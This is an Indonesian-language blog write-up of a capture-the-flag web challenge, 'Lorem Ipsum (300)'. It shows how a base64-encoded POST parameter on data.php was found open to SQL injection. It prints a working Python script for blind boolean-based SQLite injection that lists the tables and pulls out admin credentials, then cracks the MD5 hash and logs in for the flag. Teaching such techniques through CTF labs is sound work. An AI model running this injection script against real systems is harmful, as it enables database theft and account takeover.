<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="cacadosman">
<meta name="description" content="Terdapat sebuah web yang sekilas terlihat biasa saja, namun saat kita memcoba mengakses hyperlink, ternyata menggunakan ajax. Sampai disini kita curiga bahwa terdapat vuln SQLi pada url api yang menggunakan ajax, sehingga dengan menggunakan HTTP Trace kita dapat mengetahui url api nya.
Yaitu pada **data.php **dan kita bisa memasukkan inputan pada parameter id dengan metode post, namun inputan harus dalam bentuk base64. Lalu kita coba kirimkan sebuah payload ke url tsb:" />
<meta name="keywords" content="tutorial, computer, computer science, programming, php, html, python, js, javascript" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://cacadosman.com/writeup-sqli-btp-lorem-ipsum-300/" />
<script data-ad-client="ca-pub-1212398342960051" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>


    <title>
        
            WriteUp SQLi BTP - Lorem Ipsum (300) :: Infinite Overflow  — Sebuah Coretan Tak Bermakna
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">




<meta itemprop="name" content="WriteUp SQLi BTP - Lorem Ipsum (300)">
<meta itemprop="description" content="Terdapat sebuah web yang sekilas terlihat biasa saja, namun saat kita memcoba mengakses hyperlink, ternyata menggunakan ajax. Sampai disini kita curiga bahwa terdapat vuln SQLi pada url api yang menggunakan ajax, sehingga dengan menggunakan HTTP Trace kita dapat mengetahui url api nya.
Yaitu pada **data.php **dan kita bisa memasukkan inputan pada parameter id dengan metode post, namun inputan harus dalam bentuk base64. Lalu kita coba kirimkan sebuah payload ke url tsb:">
<meta itemprop="datePublished" content="2018-07-24T14:30:19+00:00" />
<meta itemprop="dateModified" content="2018-07-24T14:30:19+00:00" />
<meta itemprop="wordCount" content="353">
<meta itemprop="image" content="https://cacadosman.com/"/>



<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://cacadosman.com/"/>

<meta name="twitter:title" content="WriteUp SQLi BTP - Lorem Ipsum (300)"/>
<meta name="twitter:description" content="Terdapat sebuah web yang sekilas terlihat biasa saja, namun saat kita memcoba mengakses hyperlink, ternyata menggunakan ajax. Sampai disini kita curiga bahwa terdapat vuln SQLi pada url api yang menggunakan ajax, sehingga dengan menggunakan HTTP Trace kita dapat mengetahui url api nya.
Yaitu pada **data.php **dan kita bisa memasukkan inputan pada parameter id dengan metode post, namun inputan harus dalam bentuk base64. Lalu kita coba kirimkan sebuah payload ke url tsb:"/>



    <meta property="article:section" content="CTF" />

    <meta property="article:section" content="Cyber Security" />

    <meta property="article:section" content="Tutorial" />



    <meta property="article:published_time" content="2018-07-24 14:30:19 &#43;0000 &#43;0000" />








    </head>

    <body class="">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">Infinite Overflow</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://cacadosman.com/about">About</a></li><li><a href="https://cacadosman.com/chat">Chatbox</a></li><li><a href="https://cacadosman.com/posts">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://cacadosman.com/writeup-sqli-btp-lorem-ipsum-300/">WriteUp SQLi BTP - Lorem Ipsum (300)</a></h2>

            

            <div class="post-content">
                <p>Terdapat sebuah web yang sekilas terlihat biasa saja, namun saat kita memcoba mengakses hyperlink, ternyata menggunakan ajax. Sampai disini kita curiga bahwa terdapat vuln SQLi pada url api yang menggunakan ajax, sehingga dengan menggunakan HTTP Trace kita dapat mengetahui url api nya.</p>
<p><img src="/wp-content/2018/07/btpsqli.png" alt=""></p>
<p>Yaitu pada **data.php **dan kita bisa memasukkan inputan pada parameter id dengan metode post, namun inputan harus dalam bentuk base64. Lalu kita coba kirimkan sebuah payload ke url tsb:</p>
<p><img src="/wp-content/2018/07/btpsqli2.png" alt=""></p>
<p>Ternyata saat kita inputkan “1 or 1 &ndash; -” terdapat sebuah results yang menandakan bahwa vuln terhadap SQL Injection.
Setelah kita analisa ternyata menggunakan SQLite dan query union ternyata difilter juga sehingga kita terpaksa menggunakan teknik Blind Boolean Based.</p>
<p>kita perlu mencari nama tabel, kolom, dan value nya dengan menggunakan script berikut:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> base64

url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://35.187.236.126:8013/data.php&#34;</span>
charlist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz1234567890 _,)(:}{</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
temp <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">while</span>(True):
   temp <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;a&#34;</span>]
   <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(charlist)):
       temp[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> charlist[i]
       res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(temp)
       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT group_concat(tbl_name,&#39;:&#39;) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT sql FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name NOT LIKE &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
       payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;(select CASE WHEN (select group_concat(admin_id) from n1mbusadmin) like &#39;&#34;</span> <span style="color:#f92672">+</span> res <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
       p64 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload)
       r <span style="color:#f92672">=</span> post(url, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>:p64})
       <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Lorem Ipsum&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
           <span style="color:#66d9ef">print</span> res
           <span style="color:#66d9ef">break</span>
       <span style="color:#66d9ef">else</span>:
           <span style="color:#66d9ef">print</span> res
</code></pre></div><p>Dengan menggunakan script diatas kita bisa mengetahui nama tabel, kolom, dan value nya. Sehingga kita mendapatkan hasil:</p>
<pre><code>Tabel: config, n1mbusadmin, news
Kolom: 
- config : admin_url
- n1mbusadmin : op, admin_id, admin_pass
- news : news_id, content
Value:
- admin_url : 1n1admbr0
- admin_id : backupuser
- admin_pass : a5b6e34b25f4722b811d371e957aea29
</code></pre>
<p>Karena admin_pass masih berupa md5hash sehingga kita perlu meng-unhash pada website ternama seperti hashki*ller sehingga kita mendapatkan admin_pass sesungguhnya yaitu:</p>
<!-- raw HTML omitted -->
<p>Oke, saatnya mengeksekusi. kita mendapatkan admin_url, sehingga kita bisa mencoba untuk mengakses url tsb:</p>
<!-- raw HTML omitted -->
<p><img src="/wp-content/2018/07/btpsqli3.png" alt=""></p>
<p>Maka muncul login form dan langsung saja kita masukkan id dan passwordnya dan VOILA kita mendapatkan sebuah FLAG</p>
<p><strong>FLAG: B2P{af39e6e718f3fb8f2de9ae9e6464b150}</strong></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
  			</div>

        
          <div id="comments" class="thin">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "infinite-overflow" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>
        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
            <span>cacadosman</span>
            <span> <a href="https://cacadosman.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>



    </body>
</html>
